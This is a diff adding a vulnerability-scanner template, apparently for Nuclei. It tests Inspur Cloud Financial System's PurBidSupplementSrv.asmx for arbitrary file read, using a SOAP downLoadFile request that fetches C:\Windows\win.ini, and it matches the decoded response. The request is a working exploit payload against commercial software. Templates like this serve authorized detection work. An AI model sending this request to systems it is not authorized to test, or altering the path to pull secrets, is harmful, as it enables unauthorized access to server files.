@@ -1,0 +1,40 @@
+id: inspur-purbidsupplementsrv-asmx-anyfile-read
+
+info:
+  name: Inspur Cloud Financial System PurBidSupplementSrv.asmx Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        POST /cwbase/service/cepp/PurBidSupplementSrv.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+
+        <?xml version="1.0"?>
+        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body xmlns:m="http://tempuri.org/">
+        <m:downLoadFile>
+        <m:filePath>C:\Windows\win.ini</m:filePath>
+        <m:offset>0</m:offset>
+        </m:downLoadFile>
+        </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '<downLoadFileResult>(.*?)</downLoadFileResult>'
+      - type: dsl
+        dsl:
+          - contains(base64_decode(regex_find(body, '<downLoadFileResult>(.*?)</downLoadFileResult>')), 'bit app support')
+          - contains(base64_decode(regex_find(body, '<downLoadFileResult>(.*?)</downLoadFileResult>')), '[files]')
+      - type: word
+        part: header
+        words:
+          - "text/xml"
